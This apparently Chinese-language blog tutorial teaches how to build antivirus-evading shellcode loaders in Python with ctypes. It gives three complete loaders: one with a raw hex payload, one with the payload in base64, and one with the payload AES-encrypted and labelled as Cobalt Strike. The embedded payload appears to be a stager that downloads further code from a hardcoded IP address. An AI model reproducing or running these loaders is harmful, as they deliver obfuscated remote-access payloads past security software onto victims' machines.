<p>ctypes 是 Python 的外部函数库。它提供了与 C 兼容的数据类型，并允许调用 DLL 或共享库中的函数。可使用该模块以纯 Python 形式对这些库进行封装。</p>
<p>主要流程</p>
<ul>
<li>调用VirtualAlloc函数，来申请一块可读可写可执行的动态内存区域。</li>
<li>调用RtlMoveMemory函数，此函数从指定内存中复制内容至另一内存里。</li>
<li>调用CreateThread函数，在主线程的基础上创建一个新线程。</li>
<li>调用WaitForSingleObject函数，等待创建的线程运行结束。</li>
</ul>
<p>当然目前来说这种比较原始的方式杀软已经杀很严了，所以之后更多要有混淆加密的操作。</p>
<p>常见的有Hex加密、AES加密、XOR加密、base64等等，或者可以自己写加密和解密，免杀效果会更好</p>
<h4 id="HEX加密"><a href="#HEX加密" class="headerlink" title="HEX加密"></a>HEX加密</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> ctypes</span><br><span class="line"><span class="comment"># length: 894 bytes</span></span><br><span class="line">buf = <span class="string">b&quot;\xfc\x48\x83\xe4\xf0\xe8\xc8\x00\x00\x00\x41\x51\x41\x50\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52\x18\x48\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a\x4d\x31\xc9\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41\xc1\xc9\x0d\x41\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52\x20\x8b\x42\x3c\x48\x01\xd0\x66\x81\x78\x18\x0b\x02\x75\x72\x8b\x80\x88\x00\x00\x00\x48\x85\xc0\x74\x67\x48\x01\xd0\x50\x8b\x48\x18\x44\x8b\x40\x20\x49\x01\xd0\xe3\x56\x48\xff\xc9\x41\x8b\x34\x88\x48\x01\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c\x24\x08\x45\x39\xd1\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b\x0c\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04\x88\x48\x01\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59\x41\x5a\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48\x8b\x12\xe9\x4f\xff\xff\xff\x5d\x6a\x00\x49\xbe\x77\x69\x6e\x69\x6e\x65\x74\x00\x41\x56\x49\x89\xe6\x4c\x89\xf1\x41\xba\x4c\x77\x26\x07\xff\xd5\x48\x31\xc9\x48\x31\xd2\x4d\x31\xc0\x4d\x31\xc9\x41\x50\x41\x50\x41\xba\x3a\x56\x79\xa7\xff\xd5\xeb\x73\x5a\x48\x89\xc1\x41\xb8\x60\x11\x00\x00\x4d\x31\xc9\x41\x51\x41\x51\x6a\x03\x41\x51\x41\xba\x57\x89\x9f\xc6\xff\xd5\xeb\x59\x5b\x48\x89\xc1\x48\x31\xd2\x49\x89\xd8\x4d\x31\xc9\x52\x68\x00\x02\x40\x84\x52\x52\x41\xba\xeb\x55\x2e\x3b\xff\xd5\x48\x89\xc6\x48\x83\xc3\x50\x6a\x0a\x5f\x48\x89\xf1\x48\x89\xda\x49\xc7\xc0\xff\xff\xff\xff\x4d\x31\xc9\x52\x52\x41\xba\x2d\x06\x18\x7b\xff\xd5\x85\xc0\x0f\x85\x9d\x01\x00\x00\x48\xff\xcf\x0f\x84\x8c\x01\x00\x00\xeb\xd3\xe9\xe4\x01\x00\x00\xe8\xa2\xff\xff\xff\x2f\x4a\x4f\x78\x4c\x00\x03\x8b\x02\x94\xad\x26\x3e\xe1\xe1\xa4\x48\xe2\xc0\xf1\x5b\x10\x17\x75\x09\x3f\x3d\xfa\xd0\xf9\xc2\x70\x02\xb3\xeb\x7c\x2d\x70\xfb\x34\x9e\x0e\x3e\x47\xcd\x1d\xc3\x4c\x0c\x33\x8b\xce\x7b\x5b\x2a\xdb\x40\xbc\x9b\x5e\x7b\x9a\x53\x88\x7e\x93\xf0\xbe\x6c\xde\x11\x29\x2d\xae\x8e\xa2\x39\xe5\x4f\x00\x55\x73\x65\x72\x2d\x41\x67\x65\x6e\x74\x3a\x20\x4d\x6f\x7a\x69\x6c\x6c\x61\x2f\x35\x2e\x30\x20\x28\x63\x6f\x6d\x70\x61\x74\x69\x62\x6c\x65\x3b\x20\x4d\x53\x49\x45\x20\x39\x2e\x30\x3b\x20\x57\x69\x6e\x64\x6f\x77\x73\x20\x4e\x54\x20\x36\x2e\x31\x3b\x20\x57\x4f\x57\x36\x34\x3b\x20\x54\x72\x69\x64\x65\x6e\x74\x2f\x35\x2e\x30\x3b\x20\x42\x4f\x49\x45\x39\x3b\x45\x4e\x55\x53\x29\x0d\x0a\x00\xc6\x24\x6a\xc0\x95\x01\xb9\x1d\x74\x0d\xbf\x57\x5c\x3d\x4a\x7f\x60\xa3\x07\xe6\x08\xb1\x97\x28\xfb\xad\x21\x89\xc1\xd0\x3a\x97\xa6\x22\x1f\xfc\xf2\x84\xa4\x04\x48\x4d\xc3\x69\x8a\x56\xbf\xd8\x30\x44\x11\x09\x9d\xfe\xdb\x1b\x35\xfe\xd7\x4d\x11\x49\x87\x3b\x4d\xaa\x39\x95\x1c\x82\xd3\xf7\x21\xf3\xb6\x46\x0d\x3b\x7d\x66\x84\x3a\xba\xc0\xc7\x42\x21\x27\x69\x3b\xca\x10\x56\xb6\xfa\xe2\xec\x57\xd0\x7f\xbc\xa5\x7d\x30\xd8\x1c\x7e\x53\xc1\xf7\x5b\xd9\xce\x24\x21\x4a\x55\x03\x88\x0e\x72\x80\x51\x5a\x92\x37\x69\x22\xf4\x72\x5e\x9a\x97\xdf\x9c\x28\xa4\x6e\x52\x50\x94\x89\xa3\x74\x69\x4e\x7f\xa5\xd0\x6c\x59\x72\x13\xb5\xf4\xde\x21\x53\x1b\x9f\x52\x83\x86\x76\x93\x9c\x21\xec\xd5\x9c\x31\x17\x60\x03\x27\x71\xc2\x46\xea\xa4\x16\xda\xe3\x6e\x11\xef\x21\x28\xb7\xe8\x5f\x63\x1b\x34\xd9\xf6\xe4\xf6\x2a\x3b\xf6\x00\xda\x13\x93\x88\x00\x41\xbe\xf0\xb5\xa2\x56\xff\xd5\x48\x31\xc9\xba\x00\x00\x40\x00\x41\xb8\x00\x10\x00\x00\x41\xb9\x40\x00\x00\x00\x41\xba\x58\xa4\x53\xe5\xff\xd5\x48\x93\x53\x53\x48\x89\xe7\x48\x89\xf1\x48\x89\xda\x41\xb8\x00\x20\x00\x00\x49\x89\xf9\x41\xba\x12\x96\x89\xe2\xff\xd5\x48\x83\xc4\x20\x85\xc0\x74\xb6\x66\x8b\x07\x48\x01\xc3\x85\xc0\x75\xd7\x58\x58\x58\x48\x05\x00\x00\x00\x00\x50\xc3\xe8\x9f\xfd\xff\xff\x34\x33\x2e\x31\x33\x38\x2e\x32\x37\x2e\x31\x32\x00\x49\x96\x02\xd2&quot;</span></span><br><span class="line"></span><br><span class="line">shellcode = buf</span><br><span class="line">shellcode = <span class="built_in">bytearray</span>(shellcode)</span><br><span class="line"><span class="comment"># 设置VirtualAlloc返回类型为ctypes.c_uint64</span></span><br><span class="line">ctypes.windll.kernel32.VirtualAlloc.restype = ctypes.c_uint64</span><br><span class="line"><span class="comment"># 申请内存</span></span><br><span class="line">ptr = ctypes.windll.kernel32.VirtualAlloc(ctypes.c_int(<span class="number">0</span>), ctypes.c_int(<span class="built_in">len</span>(shellcode)), ctypes.c_int(<span class="number">0x3000</span>), ctypes.c_int(<span class="number">0x40</span>))</span><br><span class="line"><span class="comment"># 放入shellcode</span></span><br><span class="line">buf = (ctypes.c_char * <span class="built_in">len</span>(shellcode)).from_buffer(shellcode)</span><br><span class="line">ctypes.windll.kernel32.RtlMoveMemory(</span><br><span class="line">    ctypes.c_uint64(ptr),</span><br><span class="line">    buf,</span><br><span class="line">    ctypes.c_int(<span class="built_in">len</span>(shellcode))</span><br><span class="line">)</span><br><span class="line"><span class="comment"># 创建一个线程从shellcode放置位置首地址开始执行</span></span><br><span class="line">handle = ctypes.windll.kernel32.CreateThread(</span><br><span class="line">    ctypes.c_int(<span class="number">0</span>),</span><br><span class="line">    ctypes.c_int(<span class="number">0</span>),</span><br><span class="line">    ctypes.c_uint64(ptr),</span><br><span class="line">    ctypes.c_int(<span class="number">0</span>),</span><br><span class="line">    ctypes.c_int(<span class="number">0</span>),</span><br><span class="line">    ctypes.pointer(ctypes.c_int(<span class="number">0</span>))</span><br><span class="line">)</span><br><span class="line"><span class="comment"># 等待上面创建的线程运行完</span></span><br><span class="line">ctypes.windll.kernel32.WaitForSingleObject(ctypes.c_int(handle),ctypes.c_int(-<span class="number">1</span>))</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h4 id="Base64混淆"><a href="#Base64混淆" class="headerlink" title="Base64混淆"></a>Base64混淆</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> ctypes</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="comment"># length: 894 bytes</span></span><br><span class="line"><span class="comment"># buf = b&quot;\xfc\x48\x83\xe4\xf0\xe8\xc8\x00\x00\x00\x41\x51\x41\x50\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52\x18\x48\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a\x4d\x31\xc9\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41\xc1\xc9\x0d\x41\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52\x20\x8b\x42\x3c\x48\x01\xd0\x66\x81\x78\x18\x0b\x02\x75\x72\x8b\x80\x88\x00\x00\x00\x48\x85\xc0\x74\x67\x48\x01\xd0\x50\x8b\x48\x18\x44\x8b\x40\x20\x49\x01\xd0\xe3\x56\x48\xff\xc9\x41\x8b\x34\x88\x48\x01\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c\x24\x08\x45\x39\xd1\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b\x0c\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04\x88\x48\x01\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59\x41\x5a\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48\x8b\x12\xe9\x4f\xff\xff\xff\x5d\x6a\x00\x49\xbe\x77\x69\x6e\x69\x6e\x65\x74\x00\x41\x56\x49\x89\xe6\x4c\x89\xf1\x41\xba\x4c\x77\x26\x07\xff\xd5\x48\x31\xc9\x48\x31\xd2\x4d\x31\xc0\x4d\x31\xc9\x41\x50\x41\x50\x41\xba\x3a\x56\x79\xa7\xff\xd5\xeb\x73\x5a\x48\x89\xc1\x41\xb8\x60\x11\x00\x00\x4d\x31\xc9\x41\x51\x41\x51\x6a\x03\x41\x51\x41\xba\x57\x89\x9f\xc6\xff\xd5\xeb\x59\x5b\x48\x89\xc1\x48\x31\xd2\x49\x89\xd8\x4d\x31\xc9\x52\x68\x00\x02\x40\x84\x52\x52\x41\xba\xeb\x55\x2e\x3b\xff\xd5\x48\x89\xc6\x48\x83\xc3\x50\x6a\x0a\x5f\x48\x89\xf1\x48\x89\xda\x49\xc7\xc0\xff\xff\xff\xff\x4d\x31\xc9\x52\x52\x41\xba\x2d\x06\x18\x7b\xff\xd5\x85\xc0\x0f\x85\x9d\x01\x00\x00\x48\xff\xcf\x0f\x84\x8c\x01\x00\x00\xeb\xd3\xe9\xe4\x01\x00\x00\xe8\xa2\xff\xff\xff\x2f\x4a\x4f\x78\x4c\x00\x03\x8b\x02\x94\xad\x26\x3e\xe1\xe1\xa4\x48\xe2\xc0\xf1\x5b\x10\x17\x75\x09\x3f\x3d\xfa\xd0\xf9\xc2\x70\x02\xb3\xeb\x7c\x2d\x70\xfb\x34\x9e\x0e\x3e\x47\xcd\x1d\xc3\x4c\x0c\x33\x8b\xce\x7b\x5b\x2a\xdb\x40\xbc\x9b\x5e\x7b\x9a\x53\x88\x7e\x93\xf0\xbe\x6c\xde\x11\x29\x2d\xae\x8e\xa2\x39\xe5\x4f\x00\x55\x73\x65\x72\x2d\x41\x67\x65\x6e\x74\x3a\x20\x4d\x6f\x7a\x69\x6c\x6c\x61\x2f\x35\x2e\x30\x20\x28\x63\x6f\x6d\x70\x61\x74\x69\x62\x6c\x65\x3b\x20\x4d\x53\x49\x45\x20\x39\x2e\x30\x3b\x20\x57\x69\x6e\x64\x6f\x77\x73\x20\x4e\x54\x20\x36\x2e\x31\x3b\x20\x57\x4f\x57\x36\x34\x3b\x20\x54\x72\x69\x64\x65\x6e\x74\x2f\x35\x2e\x30\x3b\x20\x42\x4f\x49\x45\x39\x3b\x45\x4e\x55\x53\x29\x0d\x0a\x00\xc6\x24\x6a\xc0\x95\x01\xb9\x1d\x74\x0d\xbf\x57\x5c\x3d\x4a\x7f\x60\xa3\x07\xe6\x08\xb1\x97\x28\xfb\xad\x21\x89\xc1\xd0\x3a\x97\xa6\x22\x1f\xfc\xf2\x84\xa4\x04\x48\x4d\xc3\x69\x8a\x56\xbf\xd8\x30\x44\x11\x09\x9d\xfe\xdb\x1b\x35\xfe\xd7\x4d\x11\x49\x87\x3b\x4d\xaa\x39\x95\x1c\x82\xd3\xf7\x21\xf3\xb6\x46\x0d\x3b\x7d\x66\x84\x3a\xba\xc0\xc7\x42\x21\x27\x69\x3b\xca\x10\x56\xb6\xfa\xe2\xec\x57\xd0\x7f\xbc\xa5\x7d\x30\xd8\x1c\x7e\x53\xc1\xf7\x5b\xd9\xce\x24\x21\x4a\x55\x03\x88\x0e\x72\x80\x51\x5a\x92\x37\x69\x22\xf4\x72\x5e\x9a\x97\xdf\x9c\x28\xa4\x6e\x52\x50\x94\x89\xa3\x74\x69\x4e\x7f\xa5\xd0\x6c\x59\x72\x13\xb5\xf4\xde\x21\x53\x1b\x9f\x52\x83\x86\x76\x93\x9c\x21\xec\xd5\x9c\x31\x17\x60\x03\x27\x71\xc2\x46\xea\xa4\x16\xda\xe3\x6e\x11\xef\x21\x28\xb7\xe8\x5f\x63\x1b\x34\xd9\xf6\xe4\xf6\x2a\x3b\xf6\x00\xda\x13\x93\x88\x00\x41\xbe\xf0\xb5\xa2\x56\xff\xd5\x48\x31\xc9\xba\x00\x00\x40\x00\x41\xb8\x00\x10\x00\x00\x41\xb9\x40\x00\x00\x00\x41\xba\x58\xa4\x53\xe5\xff\xd5\x48\x93\x53\x53\x48\x89\xe7\x48\x89\xf1\x48\x89\xda\x41\xb8\x00\x20\x00\x00\x49\x89\xf9\x41\xba\x12\x96\x89\xe2\xff\xd5\x48\x83\xc4\x20\x85\xc0\x74\xb6\x66\x8b\x07\x48\x01\xc3\x85\xc0\x75\xd7\x58\x58\x58\x48\x05\x00\x00\x00\x00\x50\xc3\xe8\x9f\xfd\xff\xff\x34\x33\x2e\x31\x33\x38\x2e\x32\x37\x2e\x31\x32\x00\x49\x96\x02\xd2&quot;</span></span><br><span class="line"><span class="comment"># print(base64.b64encode(buf))</span></span><br><span class="line">buf=<span class="string">b&#x27;/EiD5PDoyAAAAEFRQVBSUVZIMdJlSItSYEiLUhhIi1IgSItyUEgPt0pKTTHJSDHArDxhfAIsIEHByQ1BAcHi7VJBUUiLUiCLQjxIAdBmgXgYCwJ1couAiAAAAEiFwHRnSAHQUItIGESLQCBJAdDjVkj/yUGLNIhIAdZNMclIMcCsQcHJDUEBwTjgdfFMA0wkCEU50XXYWESLQCRJAdBmQYsMSESLQBxJAdBBiwSISAHQQVhBWF5ZWkFYQVlBWkiD7CBBUv/gWEFZWkiLEulP////XWoASb53aW5pbmV0AEFWSYnmTInxQbpMdyYH/9VIMclIMdJNMcBNMclBUEFQQbo6Vnmn/9Xrc1pIicFBuGARAABNMclBUUFRagNBUUG6V4mfxv/V61lbSInBSDHSSYnYTTHJUmgAAkCEUlJBuutVLjv/1UiJxkiDw1BqCl9IifFIidpJx8D/////TTHJUlJBui0GGHv/1YXAD4WdAQAASP/PD4SMAQAA69Pp5AEAAOii////L0pPeEwAA4sClK0mPuHhpEjiwPFbEBd1CT89+tD5wnACs+t8LXD7NJ4OPkfNHcNMDDOLzntbKttAvJtee5pTiH6T8L5s3hEpLa6OojnlTwBVc2VyLUFnZW50OiBNb3ppbGxhLzUuMCAoY29tcGF0aWJsZTsgTVNJRSA5LjA7IFdpbmRvd3MgTlQgNi4xOyBXT1c2NDsgVHJpZGVudC81LjA7IEJPSUU5O0VOVVMpDQoAxiRqwJUBuR10Db9XXD1Kf2CjB+YIsZco+60hicHQOpemIh/88oSkBEhNw2mKVr/YMEQRCZ3+2xs1/tdNEUmHO02qOZUcgtP3IfO2Rg07fWaEOrrAx0IhJ2k7yhBWtvri7FfQf7ylfTDYHH5Twfdb2c4kIUpVA4gOcoBRWpI3aSL0cl6al9+cKKRuUlCUiaN0aU5/pdBsWXITtfTeIVMbn1KDhnaTnCHs1ZwxF2ADJ3HCRuqkFtrjbhHvISi36F9jGzTZ9uT2Kjv2ANoTk4gAQb7wtaJW/9VIMcm6AABAAEG4ABAAAEG5QAAAAEG6WKRT5f/VSJNTU0iJ50iJ8UiJ2kG4ACAAAEmJ+UG6EpaJ4v/VSIPEIIXAdLZmiwdIAcOFwHXXWFhYSAUAAAAAUMPon/3//zQzLjEzOC4yNy4xMgBJlgLS&#x27;</span></span><br><span class="line">buf=base64.b64decode(buf)</span><br><span class="line">shellcode = buf</span><br><span class="line">shellcode = <span class="built_in">bytearray</span>(shellcode)</span><br><span class="line"><span class="comment"># 设置VirtualAlloc返回类型为ctypes.c_uint64</span></span><br><span class="line">ctypes.windll.kernel32.VirtualAlloc.restype = ctypes.c_uint64</span><br><span class="line"><span class="comment"># 申请内存</span></span><br><span class="line">ptr = ctypes.windll.kernel32.VirtualAlloc(ctypes.c_int(<span class="number">0</span>), ctypes.c_int(<span class="built_in">len</span>(shellcode)), ctypes.c_int(<span class="number">0x3000</span>), ctypes.c_int(<span class="number">0x40</span>))</span><br><span class="line"><span class="comment"># 放入shellcode</span></span><br><span class="line">buf = (ctypes.c_char * <span class="built_in">len</span>(shellcode)).from_buffer(shellcode)</span><br><span class="line">ctypes.windll.kernel32.RtlMoveMemory(</span><br><span class="line">    ctypes.c_uint64(ptr),</span><br><span class="line">    buf,</span><br><span class="line">    ctypes.c_int(<span class="built_in">len</span>(shellcode))</span><br><span class="line">)</span><br><span class="line"><span class="comment"># 创建一个线程从shellcode放置位置首地址开始执行</span></span><br><span class="line">handle = ctypes.windll.kernel32.CreateThread(</span><br><span class="line">    ctypes.c_int(<span class="number">0</span>),</span><br><span class="line">    ctypes.c_int(<span class="number">0</span>),</span><br><span class="line">    ctypes.c_uint64(ptr),</span><br><span class="line">    ctypes.c_int(<span class="number">0</span>),</span><br><span class="line">    ctypes.c_int(<span class="number">0</span>),</span><br><span class="line">    ctypes.pointer(ctypes.c_int(<span class="number">0</span>))</span><br><span class="line">)</span><br><span class="line"><span class="comment"># 等待上面创建的线程运行完</span></span><br><span class="line">ctypes.windll.kernel32.WaitForSingleObject(ctypes.c_int(handle),ctypes.c_int(-<span class="number">1</span>))</span><br></pre></td></tr></table></figure>

<h4 id="AES混淆"><a href="#AES混淆" class="headerlink" title="AES混淆"></a>AES混淆</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">from</span> binascii <span class="keyword">import</span> b2a_hex, a2b_hex</span><br><span class="line"><span class="keyword">import</span> ctypes,base64</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 如果text不足16位的倍数就用空格补足为16位</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add_to_16</span>(<span class="params">text</span>):</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(text.encode(<span class="string">&#x27;utf-8&#x27;</span>)) % <span class="number">16</span>:</span><br><span class="line">        add = <span class="number">16</span> - (<span class="built_in">len</span>(text.encode(<span class="string">&#x27;utf-8&#x27;</span>)) % <span class="number">16</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        add = <span class="number">0</span></span><br><span class="line">    text = text + (<span class="string">&#x27;\0&#x27;</span> * add)</span><br><span class="line">    <span class="keyword">return</span> text.encode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 解密后，去掉补足的空格用strip() 去掉</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">decrypt</span>(<span class="params">text</span>):</span><br><span class="line">    key = <span class="string">&#x27;9999999999999999&#x27;</span>.encode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">    iv = <span class="string">b&#x27;qqqqqqqqqqqqqqqq&#x27;</span></span><br><span class="line">    mode = AES.MODE_CBC</span><br><span class="line">    cryptos = AES.new(key, mode, iv)</span><br><span class="line">    plain_text = cryptos.decrypt(a2b_hex(text))</span><br><span class="line">    shellcode=<span class="built_in">bytes</span>.decode(plain_text).rstrip(<span class="string">&#x27;\0&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> shellcode</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">zhixing</span>(<span class="params">shellcode</span>):</span><br><span class="line">    rwxpage = ctypes.windll.kernel32.VirtualAlloc(<span class="number">0</span>, <span class="built_in">len</span>(shellcode), <span class="number">0x1000</span>, <span class="number">0x40</span>)</span><br><span class="line">    ctypes.windll.kernel32.RtlMoveMemory(rwxpage, ctypes.create_string_buffer(shellcode), <span class="built_in">len</span>(shellcode))</span><br><span class="line">    handle = ctypes.windll.kernel32.CreateThread(<span class="number">0</span>, <span class="number">0</span>, rwxpage, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>)</span><br><span class="line">    ctypes.windll.kernel32.WaitForSingleObject(handle, -<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    <span class="comment">#msf</span></span><br><span class="line">    <span class="comment">#e=&#x27;b1f1a80ed13fac07e7f7d839e53a058e16908aa591d2b376bb04ebcccbd18f2005d456c578ce31065a5ae16e6823cfdc5b99f3d9f61eed342cf34c85a87201a29e2f6e119da6f7636c3aec6b9272cfd5e6e1882f554dbf3739f74e4df7a2f18823da1902a0424b86da0d65d10cda498e0169b3bcd73db537336df9d18ba0cc1c4e9550563c7e4f29dcfe0ddc104a172a25654dd3b75b8d8fdeba401eff9f783ba7c0b67dc79c6d7f5d8ab6dc7ce0fe3c2f65c82744b70a25d718a0f13cf031e54a30064b8f7ad4e1cff48a95af9701098a37dcd1897b54ce68a89d28bd6bd19ce792dc3625b373c34e60ed29d780f59f162fd86dc7b1c02045cf63de0a3a34af04209020efadf399d97ddc89e59a1c57ba756b589b5dc807c87d8be291917891a5bd14a6ea5fceb3163629978f067a4d9f6c223dcf29f2ce0c5af94b7f6b7b0ec93dd96bf92b316816016cabeb86a14e747db773e3cd623552237f0be1b05b9d5a7a200d18281c872b3da5cd941f633b21ff30625373f52f215e6adbaff429a51a451ce0ca1134314b24f57229465b20d1fd2e13a86480651f17939aeb78065d4a64c9f22c0263b636a2fefdacf1d62984db64d02732b71b0368042bf42d2f2c72a25c533c95eec1ede2d950e426c1e6ab007ae425f654bdabc1b2198fcf589affe811e6000cd8f05c40631e045efdc42c5bf0217e669af2ad42a9f879ba5b5aa9cb562d59458ce7bc775153d456e453fc3b95a8f2d32d280e3dd58445209f28c860c80235a039b1f49ff1d4b673d19c8a6181b7b4ab21b512e036df1faae4c1e5a15ff6554fe2d866622e62fac943b6a84a8f5eed44892598aa46973b8ed41fb7e453e979766462760a8dc915710beb422e39124d1de7dc6b4c4bc58bd95613&#x27;</span></span><br><span class="line">    <span class="comment">#cs</span></span><br><span class="line">    e=<span class="string">&#x27;0e0d6b374430510532fb94ec3f9e3e933e26c58c784e26a7a50308a6cb9286b75810a376913a4d162ce26bf16c27d8924223ea45360e595f28130c67ef3e51c6f1b21d375aaa1b97e74bab97c9b87f80842cf3597d9b5cfbe361c30c54cce15aa6fafc88fd015f303c60a96900736b35f9d8aa9f0b8f1f89133d959a633e471a6b8aa5004d271541075a6bff3dcea93036aa3ebb4621eec32350be5b73e2aa90370b97c1544258f017466e8235f03b17b282ecbd6845340ca1f87e6f58a844974aa52f1544f92df67cc29046a14c0f6528c1b20e8f82e81ff182dba4d6320082ca98bb13d28ddc7304198039b87560a12054769073faa0bb0f07ac4b12cb19c48c7d3c002d19e5e6d439f1c822e7a6fbcef094f6840aec0672d8b2b669a0fed0bbe954260658ce63e4c75e307d47528fae505ee795a14a2f0e51812119e5480a6ee0b267be2df03994c8564aac446538a6fa2d65912ee020d783603ba3fb7bb5653994418cbe6d9a30c2730c043876d5713423d60d622fbfa418f25d28f3c6599df2d4458be05e1bfbd60abc3ef71cd64812681308f73920ef7fab1318758e8a940ba7eafa3599971b841069b67ef10b88ba58b9ad13ac676700394ec521eb040acd080f491903baa8352f8db8114ea920690978aea20c30855b786124f3d27b90155ee3533ee3620a5f48d26e38b60d786d2e7ff41a07fcc9c1e0abbacfce32b5765901b576fe110bed31374b8de6c4db5316c57dda772fe5b1736b5314e2a3b8b1d665e272024dfd433b0dbd0fef3981f5087866bba50a686575e2b0f26903a54172826e0bb3713cf85b29e227c69fb6f31ca2d462decc5e3213fbb472bbd91a47316ce02b7a99122543b7db75de61e5a34944f10c08dd5ecac8f3b7e28bbe24f2cb3ef6258ef404ab222b9f128acdeec3e8dd123273fb0db73f66fe6e06e6276e3294bac412689da195e240c37b0d7803ceab2deee1a4902ef3b85a1d81a5128591a31d7b12f1773c54fbd56ebdee86f19d0cd100dd83964c8525e2f3af81c4d19603483af04b8d2d21b026ae2af9edc293c66ee40d6be7ffa35b5b0e8e5ece4f9b15097ab1471b3fa5cc8d6ee1431a8a32562641e36fc5b44c422e25482ca319882691150f8713cd8d90ed3eacec170039923a8c4b70d64773260a30d23526356c31a40675b54d6546b1c84ae338f6173eeacb03a892331dc5e9cbf0b78a2bb5ceb434d7d72441565620a9c4ab156030f35ede7dad650483cbdf8e91d64250c6dbefe3ffeaa3ea77f82f270b48a232d35fb66db49aae980180625387a8bf317beed2f612c546f015864578629c020c8f2fca445bd03c74bf7bb882d051a9b8c55ce2cc73948ad171d3a802f8bbe1b542fc36b26171d2d02e2c4cd56e2bad9983145c7011d00e5cc77967b5b980ccb9b4fd6f28efcc8538cc62d5f9ddf9e67609ce9de733109f4c8ccfbfd705d068f2e09618838270591553d662713754382047a2f8dd65e6850db61bc4ad61606e&#x27;</span></span><br><span class="line">    d = decrypt(e)  <span class="comment"># 解密</span></span><br><span class="line">    d=base64.b64decode(d)</span><br><span class="line">    zhixing(d)</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

